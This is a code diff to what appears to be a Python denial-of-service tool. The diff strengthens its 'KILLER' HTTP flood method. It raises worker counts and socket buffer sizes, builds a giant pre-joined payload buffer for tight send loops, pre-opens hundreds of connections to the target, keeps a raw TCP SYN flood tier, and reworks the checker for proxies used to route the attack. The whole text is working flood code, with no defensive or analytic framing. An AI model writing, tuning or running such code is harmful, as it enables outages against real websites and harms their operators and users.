@@ -106,11 +106,12 @@ PROXY_MIN_VERIFIED: int = 300
 PROXY_CACHE_TTL: int = 180
 
 # KILLER method configuration
-KILLER_MAX_WORKERS: int = min(500, (os.cpu_count() or 4) * 32)
-KILLER_ASYNC_CONNS: int = 2000
-KILLER_KEEPALIVE_REQS: int = 100
-KILLER_SNDBUF_SIZE: int = 262144
+KILLER_MAX_WORKERS: int = min(2000, (os.cpu_count() or 4) * 64)
+KILLER_SNDBUF_SIZE: int = 524288
 KILLER_PAYLOAD_COUNT: int = 750
+KILLER_MEGA_COUNT: int = 20000
+KILLER_MEGA_CHUNK: int = 8192
+KILLER_BATCH_UPDATE: int = 100
 _killer_pool: ThreadPoolExecutor = ThreadPoolExecutor(
     max_workers=KILLER_MAX_WORKERS, thread_name_prefix="killer")
 _killer_engine_lock: Lock = Lock()
@@ -1090,34 +1091,39 @@ class HttpFlood(Thread):
                        daemon=True).start()
         self._synevent.wait()
 
-    # ── KILLER engine: launches all tiers once ──
+    # ── KILLER engine: launches super-speed flood tiers ──
     @staticmethod
     def _killer_engine(payloads: List[bytes], host: str, target: Any,
                        synevent: Event, is_https: bool, port: int) -> None:
         buf_size = KILLER_SNDBUF_SIZE
-        payload_count = len(payloads)
 
-        # Tier 1: Thread pool with keep-alive connection reuse
-        for _ in range(KILLER_MAX_WORKERS):
-            _killer_pool.submit(_killer_t1_worker, payloads, payload_count,
-                                host, port, is_https, synevent, buf_size)
+        # Build mega buffer: flatten ALL payloads into one giant bytearray
+        # Workers just send slices of this — zero Python overhead per request
+        mega = b"".join(randchoice(payloads) for _ in range(KILLER_MEGA_COUNT))
+        mega_len = len(mega)
 
-        # Tier 2: Async I/O for massive concurrent connections
-        try:
-            if os.name == 'nt':
-                asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
-            loop = asyncio.new_event_loop()
-            asyncio.set_event_loop(loop)
-            loop.run_until_complete(
-                _killer_t2_async_flood(payloads, payload_count,
-                                       host, port, is_https, synevent))
-        except Exception:
-            pass
-        finally:
+        # Pre-warm connections (establish before workers start)
+        pre_warmed = []
+        n_warm = min(KILLER_MAX_WORKERS, 300)
+        for i in range(n_warm):
             try:
-                loop.close()
+                s = _killer_open_connection(host, port, is_https)
+                s.setsockopt(IPPROTO_TCP, SO_SNDBUF, buf_size)
+                pre_warmed.append(s)
             except Exception:
                 pass
+
+        # Submit one worker per pre-warmed connection — ultra-tight send loop
+        for s in pre_warmed:
+            _killer_pool.submit(_killer_super_worker, s, mega, mega_len,
+                                KILLER_MEGA_CHUNK, synevent)
+
+        # Launch extra workers that open their own connections
+        remaining = max(KILLER_MAX_WORKERS - len(pre_warmed), 0)
+        thread_args = (mega, mega_len, KILLER_MEGA_CHUNK,
+                       host, port, is_https, synevent, buf_size)
+        for _ in range(remaining):
+            _killer_pool.submit(_killer_connect_worker, *thread_args)
 
         # Tier 3: Raw TCP SYN flood (admin/root only, not for HTTPS)
         if not is_https:
@@ -1517,70 +1523,42 @@ def _killer_open_connection(host: str, port: int, is_https: bool) -> Any:
     return sock
 
 
-def _killer_t1_worker(payloads: List[bytes], payload_count: int,
-                      host: str, port: int, is_https: bool,
-                      synevent: Event, buf_size: int) -> None:
+def _killer_super_worker(sock: socket, mega: bytes, mega_len: int,
+                         chunk_size: int, synevent: Event) -> None:
+    global BYTES_SEND, REQUESTS_SENT
+    pos = 0
+    batch = 0
+    while synevent.is_set():
+        end = min(pos + chunk_size, mega_len)
+        try:
+            sock.send(mega[pos:end])
+        except Exception:
+            break
+        pos = end
+        if pos >= mega_len:
+            pos = 0
+        batch += 1
+        if batch >= KILLER_BATCH_UPDATE:
+            BYTES_SEND += batch * chunk_size
+            REQUESTS_SENT += batch
+            batch = 0
+    Tools.safe_close(sock)
+    if batch:
+        BYTES_SEND += batch * chunk_size
+        REQUESTS_SENT += batch
+
+
+def _killer_connect_worker(mega: bytes, mega_len: int, chunk_size: int,
+                           host: str, port: int, is_https: bool,
+                           synevent: Event, buf_size: int) -> None:
+    """Worker that opens its own connection, then enters the tight send loop."""
     while synevent.is_set():
         try:
             s = _killer_open_connection(host, port, is_https)
-        except Exception:
-            continue
-        try:
             s.setsockopt(IPPROTO_TCP, SO_SNDBUF, buf_size)
         except Exception:
-            pass
-        try:
-            for _ in range(KILLER_KEEPALIVE_REQS):
-                if not synevent.is_set():
-                    break
-                payload = randchoice(payloads)
-                if not Tools.send(s, payload):
-                    break
-        except Exception:
-            pass
-        Tools.safe_close(s)
-
-
-async def _killer_t2_async_flood(payloads: List[bytes], payload_count: int,
-                                 host: str, port: int, is_https: bool,
-                                 synevent: Event) -> None:
-    tasks = []
-    for _ in range(KILLER_ASYNC_CONNS):
-        tasks.append(asyncio.create_task(
-            _killer_t2_async_worker(payloads, payload_count,
-                                    host, port, is_https, synevent)))
-    await asyncio.gather(*tasks, return_exceptions=True)
-
-
-async def _killer_t2_async_worker(payloads: List[bytes], payload_count: int,
-                                  host: str, port: int, is_https: bool,
-                                  synevent: Event) -> None:
-    ssl_ctx = ctx if is_https else None
-    while synevent.is_set():
-        try:
-            reader, writer = await asyncio.wait_for(
-                asyncio.open_connection(host, port, ssl=ssl_ctx),
-                timeout=5.0)
-        except Exception:
-            await asyncio.sleep(0.005)
             continue
-        try:
-            for _ in range(KILLER_KEEPALIVE_REQS):
-                if not synevent.is_set():
-                    break
-                payload = randchoice(payloads)
-                writer.write(payload)
-                await asyncio.wait_for(writer.drain(), timeout=2.0)
-                global BYTES_SEND, REQUESTS_SENT
-                BYTES_SEND += len(payload)
-                REQUESTS_SENT += 1
-        except Exception:
-            pass
-        try:
-            writer.close()
-            await asyncio.wait_for(writer.wait_closed(), timeout=2.0)
-        except Exception:
-            pass
+        _killer_super_worker(s, mega, mega_len, chunk_size, synevent)
 
 
 def _killer_t3_raw_tcp(host: str, port: int, synevent: Event) -> None:
@@ -1624,47 +1602,34 @@ def _killer_t3_build_syn(dst_ip: str, dst_port: int) -> bytes:
 # Fast proxy checker — async with 2000+ concurrency, 2s timeout
 # ═══════════════════════════════════════════════════════════════
 
-async def _check_proxies_fast(proxies: Collection[Proxy], url: str) -> Set[Proxy]:
-    verified: Set[Proxy] = set()
+def _check_proxies_fast(proxies: Collection[Proxy], url: str) -> Set[Proxy]:
     total = len(proxies)
+    verified: Set[Proxy] = set()
     checked = 0
-    failed = 0
-    sem = asyncio.Semaphore(PROXY_CHECK_MAX_CONCURRENT)
-    lock = asyncio.Lock()
+    lock = Lock()
+    min_ok = min(PROXY_MIN_VERIFIED, total)
 
-    async def _check_one(proxy: Proxy) -> None:
-        nonlocal checked, failed
-        async with sem:
-            ok = False
-            try:
-                ok = await asyncio.wait_for(
-                    asyncio.to_thread(proxy.check, url, PROXY_CHECK_TIMEOUT),
-                    timeout=PROXY_CHECK_TIMEOUT + 0.5)
-            except Exception:
-                pass
-            async with lock:
-                checked += 1
-                if ok:
-                    verified.add(proxy)
-                    print(f"\r  [{checked}/{total}] \033[92m\u2713 {proxy.host}:{proxy.port}\033[0m          ", end="", flush=True)
-                else:
-                    failed += 1
-                    if checked % 50 == 0 or checked == total:
-                        print(f"\r  [{checked}/{total}] \033[91m{checked - len(verified)} failed\033[0m, \033[92m{len(verified)} ok\033[0m    ", end="", flush=True)
+    def _check_one(proxy: Proxy) -> None:
+        nonlocal checked
+        ok = proxy.check(url, PROXY_CHECK_TIMEOUT)
+        with lock:
+            checked += 1
+            if ok:
+                verified.add(proxy)
+                print(f"\r  [{checked}/{total}] \033[92m\u2713 {proxy.host}:{proxy.port}\033[0m          ", end="", flush=True)
+            elif checked % 25 == 0:
+                print(f"\r  [{checked}/{total}] \033[92m{len(verified)} ok\033[0m, \033[91m{checked - len(verified)} failed\033[0m    ", end="", flush=True)
 
-    tasks = [asyncio.create_task(_check_one(p)) for p in proxies]
-    pending = set(tasks)
-    while pending:
-        done, pending = await asyncio.wait(pending, timeout=0.25,
-                                           return_when=asyncio.FIRST_COMPLETED)
-        if len(verified) >= PROXY_MIN_VERIFIED:
-            for t in pending:
-                t.cancel()
-            break
-    for t in tasks:
-        if not t.done():
-            t.cancel()
-    print(f"\r  [{total}/{total}] \033[92m{len(verified)} ok\033[0m, \033[91m{failed} failed\033[0m          ")
+    n_workers = min(PROXY_CHECK_MAX_CONCURRENT, total)
+    with ThreadPoolExecutor(max_workers=n_workers) as pool:
+        futures = {pool.submit(_check_one, p): p for p in proxies}
+        for future in as_completed(futures):
+            if len(verified) >= min_ok:
+                for f in futures:
+                    f.cancel()
+                break
+
+    print(f"\r  [{total}/{total}] \033[92m{len(verified)} ok\033[0m, \033[91m{total - len(verified)} failed\033[0m          ")
     return verified
 
 
@@ -2042,13 +2007,9 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
             f"{bcolors.OKBLUE}{total:,}{bcolors.WARNING} proxies downloaded, checking with "
             f"{PROXY_CHECK_MAX_CONCURRENT} concurrent workers ({PROXY_CHECK_TIMEOUT}s timeout)...{bcolors.RESET}")
 
-        # Fast parallel check using asyncio
+        # Fast parallel check
         try:
-            loop = asyncio.new_event_loop()
-            asyncio.set_event_loop(loop)
-            verified = loop.run_until_complete(
-                _check_proxies_fast(all_proxies, target_url))
-            loop.close()
+            verified = _check_proxies_fast(all_proxies, target_url)
         except Exception:
             verified = set()
 
